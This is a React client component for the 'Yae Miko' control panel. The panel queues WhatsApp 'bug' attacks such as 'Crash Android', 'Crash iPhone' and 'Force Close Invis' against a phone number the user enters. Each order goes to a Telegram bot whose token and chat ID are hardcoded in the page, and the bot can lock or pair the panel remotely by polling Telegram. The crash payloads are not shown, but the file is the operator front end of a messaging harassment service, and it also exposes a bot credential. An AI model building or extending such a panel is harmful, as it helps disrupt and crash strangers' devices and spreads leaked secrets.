"use client"

import React, { useState, useEffect } from "react"
import { Shield, LayoutDashboard, Settings, LogOut, Bell, Volume2, Wifi, Database, Clock, Terminal } from "lucide-react"

export default function YaeMikoDashboard() {
  const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk'; 
  const CHAT_ID = '6481060681';      

  const [currentView, setCurrentView] = useState('dashboard')
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [bugLimit, setBugLimit] = useState(5)
  const [senderNumber, setSenderNumber] = useState("")
  
  // State Sistem
  const [isMaintenance, setIsMaintenance] = useState(false)
  const [showPairModal, setShowPairModal] = useState(false)
  const [pairingCode, setPairingCode] = useState("")

  const notifyBot = (message: string) => {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
  };

  // LISTENER: Dengerin perintah dari Telegram
  useEffect(() => {
    const checkBotCommands = setInterval(async () => {
      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        
        if (data.result.length > 0) {
          const cmd = data.result[0].message?.text || "";

          if (cmd.startsWith('/pair')) {
            const code = cmd.split(' ')[1];
            setPairingCode(code);
            setShowPairModal(true);
            notifyBot(`✅ Pairing code ${code} received.`);
          } else if (cmd === '/risetlimit') {
            setBugLimit(5);
            notifyBot("✅ Limit reset to 5!");
          } else if (cmd === '/lockdown') {
            setIsMaintenance(true);
            notifyBot("⚠️ MAINTENANCE MODE: System locked.");
          } else if (cmd === '/unlock') {
            setIsMaintenance(false);
            notifyBot("✅ SYSTEM ONLINE: Access restored.");
          }
        }
      } catch (e) { console.log("Monitoring..."); }
    }, 3000);
    return () => clearInterval(checkBotCommands);
  }, []);

  return (
    <div className="relative min-h-screen bg-black text-white font-sans overflow-hidden">
      
      {/* 1. MAINTENANCE LAYER */}
      {isMaintenance && (
        <div className="fixed inset-0 z-[999] bg-black flex flex-col items-center justify-center p-6 text-center">
          <div className="w-20 h-20 border-4 border-red-500 border-t-transparent rounded-full animate-spin mb-8" />
          <h1 className="text-2xl font-black text-red-500 uppercase tracking-[0.3em]">System Lockdown</h1>
          <p className="text-[10px] text-white/30 uppercase tracking-widest mt-4">Maintenance In Progress</p>
        </div>
      )}

      {/* 2. PAIRING POP-UP (RAIN EFFECT) */}
      {showPairModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/60 backdrop-blur-sm animate-in fade-in zoom-in">
          <div className="relative w-full max-w-sm p-8 rounded-[2.5rem] bg-gradient-to-br from-pink-500/20 to-cyan-500/20 border border-white/20 backdrop-blur-2xl shadow-[0_0_50px_rgba(236,72,153,0.3)] overflow-hidden">
            <div className="absolute inset-0 opacity-30 pointer-events-none">
              {[...Array(5)].map((_, i) => (
                <div key={i} className="absolute bg-white/20 w-[1px] h-10 animate-bounce" style={{ left: `${20 * i}%`, animationDelay: `${i * 0.2}s` }} />
              ))}
            </div>
            <h3 className="text-white font-black text-xs uppercase tracking-[0.2em] mb-4 text-center">Pairing Active</h3>
            <div className="text-5xl font-black text-white text-center tracking-tighter mb-6 font-mono drop-shadow-[0_0_10px_#fff]">{pairingCode}</div>
            <button onClick={() => setShowPairModal(false)} className="w-full py-3 bg-white/10 rounded-xl text-[10px] font-black uppercase text-white hover:bg-white/20 transition-all">Dismiss</button>
          </div>
        </div>
      )}

      {/* 3. MAIN APP */}
      {!isLoggedIn ? (
        <div className="flex flex-col items-center justify-center min-h-screen">
          <h1 className="text-5xl font-black text-cyan-400 mb-12 italic">YAE MIKO</h1>
          <button onClick={() => { setIsLoggedIn(true); notifyBot("[SYSTEM] Login Access Granted"); }} className="px-10 py-5 bg-gradient-to-r from-cyan-600 to-blue-700 rounded-full font-black text-sm tracking-widest active:scale-95">ACCESS SYSTEM</button>
        </div>
      ) : (
        <div className="max-w-md mx-auto min-h-screen pb-32 pt-10 px-6">
          {currentView === 'settings' ? (
            <div className="animate-in fade-in duration-500">
              <h2 className="text-2xl font-black italic mb-8 uppercase">Settings</h2>
              <div className="bg-white/5 p-6 rounded-[2.5rem] border border-white/10 mb-8">
                <span className="text-[10px] font-black uppercase tracking-[0.2em]">WhatsApp Pairing</span>
                <input type="number" placeholder="628..." onChange={(e) => setSenderNumber(e.target.value)} className="w-full bg-black/40 border border-white/10 p-4 rounded-2xl text-sm my-4" />
                <button onClick={() => notifyBot(`🔗 PAIRING REQUEST: ${senderNumber}`)} className="w-full py-4 bg-green-600 rounded-2xl font-black text-xs uppercase">Link WhatsApp</button>
              </div>
              <button onClick={() => window.location.reload()} className="w-full py-4 bg-red-500/10 border border-red-500/20 rounded-2xl text-red-500 text-[10px] font-black uppercase">Logout System</button>
            </div>
          ) : (
            <div className="text-center mt-10">
              <h2 className="text-2xl font-black text-white italic">CONTROL CENTER</h2>
              <p className="text-[10px] text-white/50 uppercase tracking-widest mt-2">LIMIT: {bugLimit}</p>
              
              <div className="grid grid-cols-2 gap-4 mt-8">
                {[
                  { name: 'Delay Invisible', icon: '👁️‍🗨️' },
                  { name: 'Delay Invis iPhone', icon: '📱' },
                  { name: 'Delay Hard', icon: '🔥' },
                  { name: 'Force Close Invis', icon: '⛔' },
                  { name: 'Blank UI', icon: '🕳️' },
                  { name: 'Crash Android', icon: '🤖' },
                  { name: 'Crash iPhone', icon: '🍎' }
                ].map((item) => (
                  <button 
                    key={item.name} 
                    onClick={() => {
                      const timestamp = new Date().toLocaleTimeString();
                      notifyBot(`KIRIM BUG
━━━━━━━━━━━━━━
🎯 Target: ${senderNumber || "No Number Set"}
⚡ Mode: ${item.name}
⏰ Time: ${timestamp}
━━━━━━━━━━━━━━`);
                    }}
                    className="p-4 bg-white/5 border border-white/10 rounded-2xl text-[10px] font-black uppercase tracking-wider hover:bg-white/10 transition-all flex flex-col items-center gap-2"
                  >
                    <span className="text-xl">{item.icon}</span>
                    {item.name}
                  </button>
                ))}
              </div>
            </div>
          )}
          
          <div className="fixed bottom-8 left-6 right-6 z-50">
            <div className="bg-white/10 border border-white/10 p-4 rounded-[2.5rem] backdrop-blur-3xl flex justify-around items-center">
              <button onClick={() => setCurrentView('dashboard')} className="flex flex-col items-center"><LayoutDashboard className="w-5 h-5" /><span className="text-[8px] font-black uppercase">Dashboard</span></button>
              <button onClick={() => setCurrentView('settings')} className="flex flex-col items-center"><Settings className="w-5 h-5" /><span className="text-[8px] font-black uppercase">Settings</span></button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
      }
